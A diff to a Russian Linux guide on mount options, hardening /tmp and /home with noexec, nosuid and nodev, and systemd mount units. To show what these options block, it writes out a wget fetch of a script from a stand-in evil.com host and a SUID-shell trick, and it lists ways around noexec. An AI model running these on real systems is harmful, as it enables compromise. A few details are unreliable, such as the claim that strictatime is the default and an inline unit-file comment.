@@ -224,16 +224,318 @@ UUID=550e8400-e29b-41d4-a716-446655440002  /data    xfs   defaults,nofail       
 LABEL=SWAP                                  none     swap  sw                    0  0
 ```
 
-**Важные опции:**
+### Общие опции монтирования
+
+Опции монтирования делятся на **общие** (работают для любой ФС) и **специфичные** для конкретной файловой системы.
+
+**Базовые опции:**
 
 | Опция | Значение |
 |-------|----------|
-| defaults | rw,suid,dev,exec,auto,nouser,async |
-| noatime | Не обновлять время доступа |
-| nodiratime | Не обновлять время доступа к каталогам |
-| nofail | Не останавливать загрузку при ошибке |
-| noexec | Запретить выполнение файлов |
-| nosuid | Игнорировать SUID/SGID биты |
+| `defaults` | rw,suid,dev,exec,auto,nouser,async |
+| `ro` | Только чтение (read-only) |
+| `rw` | Чтение и запись |
+| `sync` | Синхронная запись (данные сразу на диск) |
+| `async` | Асинхронная запись (по умолчанию, быстрее) |
+| `auto` | Автомонтирование при `mount -a` |
+| `noauto` | Не монтировать автоматически |
+| `nofail` | Не останавливать загрузку при ошибке монтирования |
+
+**Опции производительности:**
+
+| Опция | Значение |
+|-------|----------|
+| `noatime` | Не обновлять время доступа (atime) |
+| `nodiratime` | Не обновлять atime для каталогов |
+| `relatime` | Обновлять atime только если atime < mtime (компромисс) |
+| `strictatime` | Всегда обновлять atime (по умолчанию, медленнее) |
+| `lazytime` | Обновлять atime в памяти, записывать на диск лениво |
+
+**Опции безопасности:**
+
+| Опция | Значение | Угроза, которую предотвращает |
+|-------|----------|-------------------------------|
+| `noexec` | Запретить выполнение файлов | Запуск вредоносных бинарников |
+| `nosuid` | Игнорировать SUID/SGID биты | Эскалация привилегий через SUID |
+| `nodev` | Игнорировать device-файлы | Создание фейковых устройств |
+
+### Безопасность через опции монтирования
+
+Правильная настройка опций — важный элемент **defense in depth** (эшелонированной защиты). Даже если атакующий загрузил вредоносный файл, ограничения монтирования могут предотвратить его выполнение.
+
+**Типичные рекомендации:**
+
+```bash
+# /tmp — временные файлы, часто цель для эксплойтов
+/dev/sda3  /tmp     ext4  defaults,noexec,nosuid,nodev  0  2
+
+# /var/tmp — аналогично
+/dev/sda4  /var/tmp ext4  defaults,noexec,nosuid,nodev  0  2
+
+# /home — пользовательские данные, SUID не нужен
+/dev/sda5  /home    ext4  defaults,nosuid,nodev         0  2
+
+# /var — логи и данные сервисов
+/dev/sda6  /var     ext4  defaults,nosuid,nodev         0  2
+
+# Съёмные носители — максимальные ограничения
+/dev/sdb1  /media/usb  vfat  noexec,nosuid,nodev,noauto,user  0  0
+```
+
+**Почему это работает:**
+
+```
+Атака: загрузка скрипта в /tmp и его выполнение
+┌──────────────────────────────────────────────────────┐
+│  $ wget http://evil.com/malware.sh -O /tmp/mal.sh   │
+│  $ chmod +x /tmp/mal.sh                              │
+│  $ /tmp/mal.sh                                       │
+│  bash: /tmp/mal.sh: Permission denied  ← noexec!    │
+└──────────────────────────────────────────────────────┘
+
+Атака: создание SUID-бинарника в /home
+┌──────────────────────────────────────────────────────┐
+│  $ cp /bin/bash /home/user/bash_suid                │
+│  $ chmod u+s /home/user/bash_suid  # требует root   │
+│  $ /home/user/bash_suid -p                          │
+│  # SUID бит игнорируется из-за nosuid               │
+└──────────────────────────────────────────────────────┘
+```
+
+!!! warning "Ограничения noexec"
+    `noexec` не защищает от:
+    
+    - `bash /tmp/script.sh` — интерпретатор вне /tmp
+    - `python /tmp/evil.py` — аналогично
+    - `ld-linux.so /tmp/binary` — прямой вызов загрузчика
+    
+    Это дополнительный барьер, а не полная защита!
+
+### Опции для конкретных файловых систем
+
+Помимо общих опций, каждая ФС имеет свои специфичные настройки:
+
+**ext4:**
+
+```bash
+# Опции ext4
+mount -t ext4 -o journal_checksum,discard,barrier /dev/sda1 /mnt
+```
+
+| Опция | Значение |
+|-------|----------|
+| `journal_checksum` | Контрольные суммы журнала |
+| `discard` | Поддержка TRIM для SSD |
+| `barrier` / `nobarrier` | Барьеры записи (целостность vs скорость) |
+| `data=journal` | Журналирование данных (медленно, надёжно) |
+| `data=ordered` | Метаданные после данных (по умолчанию) |
+| `data=writeback` | Только метаданные (быстро, рискованно) |
+
+**XFS:**
+
+```bash
+mount -t xfs -o logbufs=8,allocsize=64k /dev/sda1 /mnt
+```
+
+| Опция | Значение |
+|-------|----------|
+| `logbufs=N` | Количество буферов журнала (2-8) |
+| `allocsize=SIZE` | Размер предвыделения для streaming writes |
+| `inode64` | 64-битные номера inode (для больших ФС) |
+| `norecovery` | Монтирование без воспроизведения журнала (ro) |
+
+**Btrfs:**
+
+```bash
+mount -t btrfs -o compress=zstd,subvol=@home,space_cache=v2 /dev/sda1 /mnt
+```
+
+| Опция | Значение |
+|-------|----------|
+| `compress=ALG` | Сжатие: zlib, lzo, zstd (рекомендуется) |
+| `subvol=NAME` | Монтирование конкретного subvolume |
+| `space_cache=v2` | Кэш свободного пространства (v2 быстрее) |
+| `autodefrag` | Автоматическая дефрагментация |
+| `ssd` | Оптимизации для SSD |
+
+**Просмотр текущих опций:**
+
+```bash
+# Все смонтированные ФС
+$ mount | column -t
+
+# Подробно для конкретной точки
+$ findmnt /home
+TARGET SOURCE    FSTYPE OPTIONS
+/home  /dev/sda5 ext4   rw,nosuid,nodev,relatime
+
+# Опции в /proc
+$ cat /proc/mounts | grep /home
+```
+
+### Монтирование через systemd
+
+В современных Linux-системах с systemd можно управлять монтированием через **mount units** (`.mount`) вместо `/etc/fstab`. Это даёт больше контроля: зависимости, условия, автоматический перезапуск.
+
+!!! info "fstab vs systemd"
+    systemd автоматически генерирует `.mount` юниты из `/etc/fstab` при загрузке. Можно использовать оба подхода, но для сложных сценариев (зависимости, сетевые ФС, шифрование) явные юниты удобнее.
+
+**Именование юнитов:**
+
+Имя файла `.mount` должно соответствовать точке монтирования с заменой `/` на `-`:
+
+| Точка монтирования | Имя юнита |
+|--------------------|-----------|
+| `/mnt/data` | `mnt-data.mount` |
+| `/home` | `home.mount` |
+| `/var/lib/docker` | `var-lib-docker.mount` |
+| `/mnt/my-data` | `mnt-my\x2ddata.mount` |
+
+!!! warning "Дефис в именах директорий"
+    Поскольку `-` используется как разделитель компонентов пути, дефис **внутри** имени директории нужно экранировать как `\x2d` (hex-код символа).
+    
+    Используйте `systemd-escape` для автоматического преобразования:
+    
+    ```bash
+    # Путь → имя юнита
+    $ systemd-escape --path /mnt/my-data
+    mnt-my\x2ddata
+    
+    # Добавить суффикс .mount
+    $ systemd-escape --path --suffix=mount /mnt/my-data
+    mnt-my\x2ddata.mount
+    
+    # Обратное преобразование
+    $ systemd-escape --unescape --path mnt-my\\x2ddata
+    /mnt/my-data
+    ```
+
+**Пример: /mnt/data.mount**
+
+```ini
+# /etc/systemd/system/mnt-data.mount
+[Unit]
+Description=Data Storage Mount
+After=local-fs.target
+Requires=local-fs.target
+
+[Mount]
+What=/dev/disk/by-uuid/550e8400-e29b-41d4-a716-446655440000
+Where=/mnt/data
+Type=ext4
+Options=defaults,noatime,nosuid,nodev
+
+[Install]
+WantedBy=multi-user.target
+```
+
+**Управление:**
+
+```bash
+# Применить изменения
+sudo systemctl daemon-reload
+
+# Монтировать
+sudo systemctl start mnt-data.mount
+
+# Автомонтирование при загрузке
+sudo systemctl enable mnt-data.mount
+
+# Статус
+sudo systemctl status mnt-data.mount
+
+# Размонтировать
+sudo systemctl stop mnt-data.mount
+```
+
+**Automount — ленивое монтирование:**
+
+`.automount` юниты монтируют ФС только при первом обращении к точке монтирования. Полезно для съёмных носителей и сетевых ФС.
+
+```ini
+# /etc/systemd/system/mnt-backup.automount
+[Unit]
+Description=Automount Backup Drive
+
+[Automount]
+Where=/mnt/backup
+TimeoutIdleSec=300  # Размонтировать после 5 минут неактивности
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```ini
+# /etc/systemd/system/mnt-backup.mount
+[Unit]
+Description=Backup Drive
+
+[Mount]
+What=/dev/disk/by-label/BACKUP
+Where=/mnt/backup
+Type=ext4
+Options=defaults,noexec,nosuid,nodev
+```
+
+```bash
+# Включить automount (не .mount!)
+sudo systemctl enable --now mnt-backup.automount
+
+# Первое обращение триггерит монтирование
+$ ls /mnt/backup  # ← mount происходит здесь
+```
+
+**Зависимости и порядок:**
+
+Главное преимущество systemd — явные зависимости:
+
+```ini
+[Unit]
+Description=Application Data
+# Ждать сеть (для NFS)
+After=network-online.target
+Wants=network-online.target
+
+# Ждать расшифровку LUKS
+After=systemd-cryptsetup@encrypted.service
+Requires=systemd-cryptsetup@encrypted.service
+
+# Монтировать до запуска сервиса
+Before=myapp.service
+```
+
+**Сравнение fstab и systemd mount:**
+
+| Аспект | /etc/fstab | .mount юнит |
+|--------|------------|-------------|
+| Простота | ✅ Одна строка | Отдельный файл |
+| Зависимости | Ограничены (x-systemd.*) | Полный контроль |
+| Условия | Нет | `ConditionPathExists=`, etc. |
+| Автоперезапуск | Нет | Да |
+| Логи | `dmesg` | `journalctl -u name.mount` |
+| Сетевые ФС | `_netdev` | Явные зависимости |
+
+**Конвертация fstab → systemd:**
+
+```bash
+# Сгенерировать юнит из fstab (для просмотра)
+$ systemd-mount --no-block -p "What=/dev/sda1" -p "Where=/mnt/test" --discover
+
+# Посмотреть автосгенерированные юниты
+$ systemctl list-units --type=mount
+
+# Просмотр конкретного
+$ systemctl cat home.mount
+```
+
+!!! tip "Когда использовать systemd mount"
+    - Сетевые ФС (NFS, CIFS) с зависимостью от сети
+    - Шифрованные тома (LUKS) с зависимостью от cryptsetup
+    - Монтирование, требующее запущенного сервиса
+    - Автоматическое размонтирование по таймауту
+    - Интеграция с другими systemd юнитами
+    
+    Для простых локальных ФС `/etc/fstab` проще и понятнее.
 
 ---
 
